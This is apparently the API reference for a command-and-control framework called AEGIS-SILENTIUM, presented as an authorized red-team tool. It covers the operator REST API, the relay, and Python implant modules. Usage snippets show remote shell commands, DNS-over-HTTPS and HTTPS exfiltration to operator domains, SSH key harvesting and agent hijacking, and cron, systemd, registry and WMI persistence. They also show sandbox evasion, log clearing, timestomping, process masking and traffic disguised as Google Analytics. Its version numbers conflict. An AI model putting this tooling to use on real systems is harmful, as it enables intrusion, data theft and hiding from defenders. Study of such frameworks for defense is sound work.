# AEGIS-SILENTIUM v12 — Complete API Reference

> **AUTHORIZED USE ONLY.** This framework is for professional adversary simulation
> and proactive defense exercises in controlled, written-authorization environments.

---

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Intelligence Core (C2) REST API](#intelligence-core-c2-rest-api)
3. [Dashboard API](#dashboard-api)
4. [Relay Endpoints](#relay-endpoints)
5. [Python Implant Modules](#python-implant-modules)
6. [Shared Cryptography Library](#shared-cryptography-library)
7. [Malleable C2 Profile Engine](#malleable-c2-profile-engine)
8. [Scheduler API](#scheduler-api)
9. [Error Codes](#error-codes)

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│  OPERATOR WORKSTATION                                           │
│  scripts/inject_objective.sh  →  signed objective (ECDSA P-256)│
└───────────────────────────────┬─────────────────────────────────┘
                                │ HTTPS (public internet)
                    ┌───────────▼──────────┐
                    │  RELAY (Go)          │
                    │  TLS termination     │
                    │  ECDHE key exchange  │
                    │  Profile transform   │
                    │  mTLS → Core         │
                    └───────────┬──────────┘
                                │ WireGuard VPN + mTLS
               ┌────────────────▼────────────────┐
               │  INTELLIGENCE CORE (Python/Flask) │
               │  REST API  :5000                 │
               │  PostgreSQL (encrypted)          │
               │  Redis pubsub                    │
               └────────┬──────────┬─────────────┘
                        │          │
             ┌──────────▼──┐  ┌────▼────────────┐
             │  SCHEDULER  │  │  DASHBOARD      │
             │  :internal  │  │  :7331          │
             └─────────────┘  └─────────────────┘
```

### Communication Security

| Channel            | Protocol                                  |
|--------------------|-------------------------------------------|
| Implant → Relay    | HTTPS with malleable profile + ECDHE PFS  |
| Relay → Core       | mTLS over WireGuard VPN                   |
| Core → Dashboard   | Internal network + operator key auth      |
| Operator → Relay   | ECDSA P-256 signed objective injection    |

---

## Intelligence Core (C2) REST API

Base URL: `http://core.internal:5000` (only accessible via WireGuard)

All endpoints except `/health` require the `X-Operator-Key` header.

### Authentication

```http
X-Operator-Key: <OPERATOR_KEY from .env>
```

Requests without a valid key return `401 Unauthorized`.

---

### Health

#### `GET /health`

Unauthenticated liveness probe.

**Response `200`**
```json
{ "status": "ok", "version": "5.0" }
```

---

### Nodes

#### `GET /api/nodes`

List all registered implant nodes.

**Query Parameters**

| Parameter | Type   | Description                              |
|-----------|--------|------------------------------------------|
| `status`  | string | Filter by status: `active`, `dormant`, `dead`, `killed` |
| `limit`   | int    | Max results (default 100)                |
| `offset`  | int    | Pagination offset (default 0)            |

**Response `200`**
```json
{
  "nodes": [
    {
      "id": "node-abc123def456",
      "hostname": "WORKSTATION-01",
      "platform": "Linux",
      "os_version": "Ubuntu 22.04",
      "ip_address": "192.168.1.50",
      "internal_ips": ["192.168.1.50", "10.0.0.5"],
      "status": "active",
      "trust_score": 78,
      "is_elevated": false,
      "registered_at": "2025-01-15T09:00:00Z",
      "last_seen": "2025-01-15T10:30:00Z",
      "metadata": {}
    }
  ],
  "total": 1
}
```

#### `GET /api/nodes/<node_id>`

Get a single node by ID.

**Response `200`** — Node object (same structure as list item)

**Response `404`**
```json
{ "error": "node not found" }
```

#### `DELETE /api/nodes/<node_id>`

Mark a node as killed and queue a self-destruct command.

**Response `200`**
```json
{ "status": "kill queued", "node_id": "node-abc123def456" }
```

---

### Tasks

#### `GET /api/tasks`

List tasks with optional filters.

**Query Parameters**

| Parameter     | Type   | Description                                             |
|---------------|--------|---------------------------------------------------------|
| `node_id`     | string | Filter by node                                          |
| `status`      | string | `pending`, `running`, `done`, `failed`, `cancelled`     |
| `campaign_id` | int    | Filter by campaign                                      |
| `limit`       | int    | Max results (default 50)                                |

**Response `200`**
```json
{
  "tasks": [
    {
      "id": 42,
      "campaign_id": 1,
      "node_id": "node-abc123",
      "task_type": "scan",
      "target": "https://example.com",
      "status": "done",
      "priority": 5,
      "created_at": "2025-01-15T09:05:00Z",
      "started_at":  "2025-01-15T09:05:10Z",
      "completed_at": "2025-01-15T09:07:42Z",
      "result": { "vulnerabilities_found": 3 }
    }
  ]
}
```

#### `POST /api/tasks`

Create a new task.

**Request Body**
```json
{
  "node_id":    "node-abc123",
  "task_type":  "scan",
  "target":     "https://example.com",
  "priority":   5,
  "campaign_id": 1
}
```

**Response `201`**
```json
{ "task_id": 43, "task_uuid": "550e8400-e29b-41d4-a716-446655440000" }
```

#### `POST /api/tasks/<id>/requeue`

Reset a failed or completed task to `queued` for retry.

**Response `200`**
```json
{ "status": "requeued", "task_id": 42 }
```

#### `POST /api/tasks/<id>/cancel`

Cancel a queued or running task.

**Response `200`**
```json
{ "status": "cancelled", "task_id": 42 }
```

---

### Vulnerabilities

#### `GET /api/vulns`

List discovered vulnerabilities.

**Query Parameters**

| Parameter  | Type   | Description                                        |
|------------|--------|----------------------------------------------------|
| `node_id`  | string | Filter by node                                     |
| `severity` | string | `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFO`        |
| `target`   | string | Filter by target URL (partial match)               |
| `limit`    | int    | Max results (default 100)                          |

**Response `200`**
```json
{
  "vulnerabilities": [
    {
      "id": 1,
      "node_id": "node-abc123",
      "target": "https://example.com",
      "vuln_type": "XSS",
      "severity": "HIGH",
      "title": "Reflected XSS in search parameter",
      "url": "https://example.com/search?q=<script>",
      "parameter": "q",
      "cvss_score": 7.5,
      "cve_id": null,
      "remediation": "Encode output; implement Content-Security-Policy",
      "discovered_at": "2025-01-15T09:06:00Z"
    }
  ],
  "total": 1
}
```

#### `GET /api/vulns/<id>`

Get decrypted vulnerability details including evidence and payload.

**Response `200`** — Vulnerability object with additional `details` field.

---

### Campaigns

#### `GET /api/campaigns`

List all campaigns.

**Response `200`**
```json
{
  "campaigns": [
    {
      "id": 1,
      "name": "Q1 Red Team Exercise",
      "description": "Quarterly adversary simulation",
      "status": "active",
      "created_at": "2025-01-01T00:00:00Z"
    }
  ]
}
```

#### `POST /api/campaigns`

Create a new campaign.

**Request Body**
```json
{
  "name": "Q1 Red Team Exercise",
  "description": "Quarterly adversary simulation"
}
```

**Response `201`**
```json
{ "campaign_id": 2 }
```

#### `PATCH /api/campaigns/<id>`

Update campaign status.

**Request Body**
```json
{ "status": "paused" }
```

**Response `200`**
```json
{ "status": "updated" }
```

---

### Findings (Data Leaks)

#### `GET /api/findings`

List data-leak findings.

**Query Parameters**

| Parameter  | Type   | Description                        |
|------------|--------|------------------------------------|
| `severity` | string | Severity filter                    |
| `category` | string | Finding category                   |

---

### Exfil Receipts

#### `GET /api/exfil/receipts`

List data exfiltration receipts (logged events + filesystem scan).

**Response `200`**
```json
{
  "receipts": [
    {
      "session_id": "abc12345",
      "label": "creds",
      "size_bytes": 2048,
      "timestamp": "2025-01-15T10:00:00Z",
      "channel": "doh"
    }
  ],
  "files": ["/tmp/aegis_exfil/abc12345.bin"]
}
```

---

### Relay Mesh

#### `GET /api/relays`

List relay mesh status.

**Response `200`**
```json
{
  "relays": [
    {
      "relay_id": "relay1",
      "last_heartbeat": "2025-01-15T10:29:50Z",
      "active": true
    }
  ]
}
```

#### `POST /api/relays/stop`

Broadcast STOP signal to all relays via Redis pub/sub.

**Response `200`**
```json
{ "status": "stop_broadcast_sent" }
```

---

### Node Commands

#### `POST /api/node/command`

Send a direct command to a specific node via Redis queue.

**Request Body**
```json
{
  "node_id": "node-abc123",
  "command": "{\"action\": \"shell\", \"cmd\": \"id\"}"
}
```

**Response `200`**
```json
{ "status": "queued", "node_id": "node-abc123" }
```

---

### Beacon (Implant Check-in)

#### `POST /api/beacon/<node_id>`

Implant check-in endpoint.  Encrypted payload; handled internally.

#### `POST /api/beacon/<node_id>/result`

Implant submits a task result.  Encrypted; handled internally.

---

### Reports

#### `GET /api/report/<node_id>`

Generate an HTML scan report for a node.

**Response `200`** — Full HTML report document.

#### `GET /api/report/<node_id>/json`

Get the raw JSON data for a node's report.

---

### Emergency

#### `POST /api/emergency/stop`

Operator-signed emergency stop.  Kills all active nodes.

**Request Body**
```json
{
  "payload": "<base64 payload>",
  "sig": "<base64 ECDSA signature>",
  "ts": 1705312800
}
```

---

### Silentium Status

#### `GET /api/silentium/status`

Full system status summary.

**Response `200`**
```json
{
  "framework": "AEGIS-SILENTIUM",
  "version": "5.0",
  "nodes": { "active": 3, "dormant": 1, "dead": 0 },
  "tasks": { "pending": 2, "running": 1, "done": 45 },
  "campaigns": { "active": 1 },
  "uptime_seconds": 86400
}
```

---

## Dashboard API

Base URL: `http://localhost:7331`

The dashboard is a read-only Flask application that proxies filtered data
from the Core.  It uses the same `X-Operator-Key` authentication.

All Core `/api/*` endpoints are available at `/api/*` on the dashboard
with identical semantics but in read-only mode (no POST/PATCH/DELETE).

Additional dashboard-only endpoints:

#### `GET /`

Serve the operator dashboard HTML interface.

#### `GET /nodes`

Node management view.

#### `GET /vulns`

Vulnerability browser.

#### `GET /reports/<node_id>`

Render a vulnerability report.

---

## Relay Endpoints

The relay is a stateless TLS proxy and does not expose management endpoints.
All relay → core communication uses encrypted internal channels.

### Public (Implant-Facing)

| Path                   | Method | Description                       |
|------------------------|--------|-----------------------------------|
| `<profile_uri[0]>`     | POST   | Beacon check-in (malleable)       |
| `<profile_uri[1]>`     | POST   | ECDHE key exchange handshake      |
| `/api/objective`       | POST   | Signed operator objective inject  |
| `/health`              | GET    | Relay liveness probe              |

The URIs for beacon/handshake are defined in the active Malleable C2 profile
(e.g. `/g/collect` and `/gtag/js` for the Google Analytics profile).

---

## Python Implant Modules

### `node/aegis_core.py` — Vulnerability Scanner

The AEGIS-v4 scanning engine integrated into the implant.

```python
from node.aegis_core import Scanner

scanner = Scanner(target="https://example.com", max_workers=3)
results = scanner.run_all_phases()
# results: {vulns: [...], urls: [...], subdomains: [...], ...}
```

**Key classes:**
- `Scanner(target, phases, max_workers, ...)` — main scanner
- `ReportGenerator(results, target, metadata)` — generates HTML reports
- `VulnResult` — dataclass for vulnerability findings

---

### `node/c2_client/beacon.py` — Beacon Client

Self-contained C2 beacon with XOR+HMAC encryption (no dependencies).

```python
from node.c2_client.beacon import BeaconClient

client = BeaconClient(
    c2_url="https://relay1.example.com:443",
    node_id="node-abc123",
    sym_key=b"32-byte-symmetric-key-here....",
    interval=60,
    jitter=0.3,
)
client.start()  # Starts background beacon loop
```

**Key classes:**
- `Transport(c2_url, proxy, verify_ssl, timeout)` — HTTP/S transport
- `CommandDispatcher(node_id, transport, sym_key)` — command execution
- `BeaconClient(c2_url, node_id, sym_key, ...)` — full beacon agent

**Supported commands:** `shell`, `python`, `upload`, `download`, `sleep`,
`kill`, `info`, `env`, `ls`, `read`, `write`

---

### `node/evasion/honeypot.py` — Environment Trust Scoring

Passive 7-dimension trust scoring to detect sandboxes and honeypots.

```python
from node.evasion.honeypot import TrustScorer

scorer = TrustScorer(threshold=40, cache_ttl=300)
assessment = scorer.assess()

if not assessment.trusted:
    # Enter dormant mode — send only benign telemetry
    telemetry = assessment.benign_telemetry()
else:
    # Proceed with normal operations
    pass
```

**Trust dimensions:**
1. ARP cache activity (live network presence)
2. User interaction evidence (shell history, idle time)
3. System uptime (≥10 min)
4. Process diversity (≥15 distinct processes)
5. File system activity (recent modification times)
6. Domain membership (AD/LDAP indicators)
7. VM artifact absence (MAC prefixes, CPUID, registry keys)

**Score: 0–100 points; trusted if ≥ threshold (default 40)**

---

### `node/exfil/doh.py` — DNS-over-HTTPS Exfiltration

```python
from node.exfil.doh import DoHTunnel, ARecordTunnel

tunnel = DoHTunnel(domain="data.operator.com", provider="cloudflare")
success = tunnel.send(b"sensitive data bytes", label="creds")

# Async version
thread = tunnel.send_async(b"data", label="docs")
```

---

### `node/exfil/channels.py` — Multi-Channel Exfil Manager

```python
from node.exfil.channels import ExfilManager

mgr = ExfilManager(
    https_url="https://relay.example.com",
    dns_domain="data.example.com",
    encrypt_key=b"32-byte-key...",
)
mgr.send(b"data to exfiltrate", channel_priority=["https", "doh", "dns"])
```

---

### `node/privesc/linux_checks.py` — Linux Privilege Escalation

```python
from node.privesc.linux_checks import run_all_checks

results = run_all_checks()
# results: {
#   "writable_paths": [...],
#   "suid_binaries": [...],
#   "sudo_rules": [...],
#   "cron_paths": [...],
#   "capabilities": [...],
#   "container_escape": {...},
#   ...
# }
```

---

### `node/lateral/ssh_mover.py` — SSH Lateral Movement

```python
from node.lateral.ssh_mover import SSHSession, harvest_ssh_keys

# Harvest SSH keys from current host
keys = harvest_ssh_keys()

# Establish SSH session
sess = SSHSession("192.168.1.100", username="admin", key_path="~/.ssh/id_rsa")
sess.connect()
stdout, stderr, rc = sess.exec("whoami")
sess.close()

# Find SSH agent sockets for hijacking
from node.lateral.ssh_mover import find_agent_sockets
sockets = find_agent_sockets()
```

---

### `node/persistence/linux.py` — Linux Persistence

```python
from node.persistence.linux import LinuxPersistence

p = LinuxPersistence(payload="/usr/bin/python3 /dev/shm/.agent &", label="sysupdate")
p.install_cron()
p.install_systemd()
p.install_ssh_key(pub_key="ssh-rsa AAAA...")
```

---

### `node/persistence/windows.py` — Windows Persistence

```python
# Windows-only; gracefully no-ops on Linux/macOS
from node.persistence.windows import WindowsPersistence

p = WindowsPersistence(payload="cmd /c start C:\\agent.exe", label="WinUpdate")
p.install_scheduled_task()
p.install_registry_run()
p.install_wmi_subscription()
```

---

### `node/opsec/clear_logs.py` — OPSEC / Log Clearing

```python
from node.opsec.clear_logs import (
    clear_system_logs, clear_shell_histories,
    timestomp, mask_process_name,
)

# Clear shell history and disable further logging
clear_shell_histories()

# Timestomp a modified file to match a reference file
timestomp("/dev/shm/.agent", ref_file="/bin/bash")

# Mask process name in /proc
mask_process_name("[kworker/0:0]")
```

---

## Shared Cryptography Library

### `shared/crypto/aes.py`

Provides AES-256-GCM (preferred), AES-256-CBC (compat), and pure-stdlib
fallback (XOR+HMAC) when `cryptography` is not installed.

```python
from shared.crypto.aes import aes_gcm_encrypt, aes_gcm_decrypt, seal_message, open_message

key = os.urandom(32)

# Low-level GCM
ct = aes_gcm_encrypt(key, b"plaintext", aad=b"additional")
pt = aes_gcm_decrypt(key, ct, aad=b"additional")

# High-level sealed envelope (includes timestamp + optional HMAC sig)
token = seal_message({"action": "scan", "target": "example.com"}, key, sign_key=key)
data  = open_message(token, key, sign_key=key)
```

**Fallback mode:** When `cryptography` is unavailable (minimal environments
like Termux or stripped containers), all functions automatically use the
built-in XOR-stream + HMAC-SHA256 fallback.  Cipher text is binary-compatible
between modes — both sides must be in the same mode.

---

### `shared/crypto/ecdhe.py`

ECDHE P-256 key exchange with HKDF-SHA256 session key derivation and
AES-256-GCM authenticated encryption.

```python
from shared.crypto.ecdhe import ECDHESession

# Implant side — initiator
session = ECDHESession()
handshake_req = session.initiate()   # dict: {pub_key_b64, nonce_b64, ...}

# After receiving relay's handshake response:
session_key = session.complete(relay_response)

# Encrypt/decrypt with the derived session key
ct_b64 = session.encrypt({"cmd": "scan", "target": "example.com"})
pt      = session.decrypt(relay_ct_b64)
```

---

### `shared/profiles/malleable.py`

Malleable C2 profile engine — mirrors the Go relay's transform logic.

```python
from shared.profiles.malleable import ProfileEngine

engine = ProfileEngine()
engine.load("/etc/aegis/profiles/google-analytics.yaml")

# Encode outgoing beacon payload
wire_bytes = engine.encode_client(json_payload_bytes)

# Decode incoming server response
plaintext = engine.decode_server(response_bytes)

# Get request headers to use
headers = engine.get_request_headers()
```

---

## Malleable C2 Profile Engine

Profiles are YAML files that control how beacon traffic looks on the wire.

### Schema

```yaml
name: my-profile
version: "1.0"

# HTTP headers added to all requests
default_headers:
  User-Agent: "Mozilla/5.0 ..."
  Accept: "*/*"

# URI paths used for check-in and handshake
uris:
  - /api/v1/events       # beacon URI
  - /api/v1/auth/token   # handshake URI

# Client (implant → relay) transform pipeline
client:
  container: json         # json | html | raw
  key: events             # JSON key wrapping the payload
  transforms:
    - op: gzip
    - op: base64url

# Server (relay → implant) transform pipeline
server:
  container: json
  key: data
  transforms:
    - op: gzip
    - op: base64url
```

### Available Transforms

| Op          | Description                                          |
|-------------|------------------------------------------------------|
| `base64`    | Standard base64 encode/decode                        |
| `base64url` | URL-safe base64 without padding                      |
| `gzip`      | Gzip compress/decompress                             |
| `xor`       | XOR with key (`arg:` sets the key string)            |
| `prepend`   | Prepend literal string (`arg:` is the prefix)        |
| `append`    | Append literal string (`arg:` is the suffix)         |
| `mask`      | Entropy masking — hex-alphabet encoding              |

Transforms are applied in order (encode) and reversed in order (decode).

### Bundled Profiles

| Profile                 | Description                                    |
|-------------------------|------------------------------------------------|
| `default.yaml`          | Generic REST API mimicry (JSON container)      |
| `google-analytics.yaml` | GA4 measurement protocol traffic pattern       |
| `microsoft-teams.yaml`  | Microsoft Teams webhook traffic pattern        |

---

## Scheduler API

Base URL: `http://scheduler:internal` (only accessible on `internal_net`)

The scheduler monitors campaigns and queues tasks based on configured cadences.

### Internal Endpoints

| Path                     | Method | Description                        |
|--------------------------|--------|------------------------------------|
| `/scheduler/status`      | GET    | Scheduler health and queue depth   |
| `/scheduler/run-now`     | POST   | Force an immediate campaign cycle  |
| `/scheduler/pause`       | POST   | Pause all scheduling               |
| `/scheduler/resume`      | POST   | Resume scheduling                  |

---

## Error Codes

All API errors use standard HTTP status codes with a JSON body:

```json
{ "error": "descriptive message" }
```

| Code | Meaning                                         |
|------|-------------------------------------------------|
| 400  | Bad request — malformed JSON or missing fields  |
| 401  | Unauthorized — missing or invalid operator key  |
| 403  | Forbidden — operation not permitted             |
| 404  | Not found — resource does not exist             |
| 409  | Conflict — e.g. duplicate campaign name         |
| 429  | Too many requests — relay rate limit exceeded   |
| 500  | Internal server error                           |
| 503  | Service unavailable — core or DB unreachable    |

---

## Environment Variables Reference

| Variable                  | Service    | Description                                       |
|---------------------------|------------|---------------------------------------------------|
| `OPERATOR_KEY`            | Core, Dash | API authentication key (≥32 chars, random)        |
| `DB_PASSWORD`             | Core, PG   | PostgreSQL password for `aegis` user              |
| `COLUMN_ENC_KEY`          | Core       | 32-byte AES key for column-level encryption       |
| `SECRET_KEY`              | Core       | Flask session secret                              |
| `DATABASE_URL`            | Core       | Full PostgreSQL DSN                               |
| `REDIS_URL`               | Core       | Redis connection string (default: `redis://redis:6379/0`) |
| `C2_URL`                  | Implant    | Relay HTTPS URL(s), comma-separated               |
| `NODE_ID`                 | Implant    | Unique node identifier                            |
| `BEACON_INTERVAL`         | Implant    | Check-in interval seconds (default: 60)           |
| `BEACON_JITTER`           | Implant    | Jitter fraction 0.0–1.0 (default: 0.3)           |
| `TRUST_THRESHOLD`         | Implant    | Min trust score for full operation (default: 40)  |
| `DOH_DOMAIN`              | Implant    | Apex domain for DoH exfiltration                  |
| `ENABLE_PERSIST`          | Implant    | `true` to allow persistence mechanisms            |
| `ENABLE_PRIVESC`          | Implant    | `true` to allow privilege escalation checks       |
| `ENABLE_LATERAL`          | Implant    | `true` to allow lateral movement                  |
| `ENABLE_OPSEC`            | Implant    | `true` to enable OPSEC (log clearing)             |
| `ENABLE_EXFIL`            | Implant    | `true` to enable data exfiltration                |
| `OPERATOR_PUBKEY_DER_B64` | Relay      | Base64 DER of operator ECDSA public key           |
| `RELAY_SIGNING_PUBKEY_B64`| Implant    | Base64 DER of relay ECDSA signing public key      |
| `RELAY_ID`                | Relay      | Relay identifier (e.g. `relay1`)                  |

---

## v10 Distributed Systems API

All endpoints under `/api/distributed/*` require `nodes:view` permission minimum.

### GET /api/distributed/status
Returns live status of all distributed subsystems: HLC timestamp, WAL stats, DLQ depth, fencing epoch, ring nodes, bloom count.

### GET /api/distributed/hlc
Advances the HLC clock and returns the new timestamp `{hlc: {l, c}, str}`.

### POST /api/distributed/merkle
Body: `{state: {key: value, ...}}`. Computes a Merkle tree and returns root hash + leaf list.

### GET /api/distributed/wal
Returns WAL statistics: entry count, next index, snapshot index.

### POST /api/distributed/wal/append
Body: `{key, value, op}`. Appends a WAL entry and applies it to the state machine. Requires `nodes:command`.

### GET /api/distributed/fencing/epoch
Returns current fencing token epoch.

### POST /api/distributed/fencing/new-epoch
Bumps the fencing epoch (leader election signal). Requires `nodes:kill`.

### GET /api/distributed/ring
Returns nodes registered in the consistent hash ring.

### POST /api/distributed/ring/route
Body: `{key, n}`. Returns the `n` nodes responsible for `key`.

### POST /api/distributed/bloom
Body: `{item}`. Tests membership in the Bloom filter.

### GET /api/distributed/dlq
Query params: `source`, `resolved`, `limit`. Returns Dead Letter Queue entries.

### POST /api/distributed/dlq/{entry_id}/resolve
Marks a DLQ entry as resolved. Requires `nodes:command`.

### GET /api/distributed/task-queue
Returns priority task queue statistics.

### GET /api/distributed/chaos/experiments
Lists registered chaos experiments, recent results, and pass-rate summary.
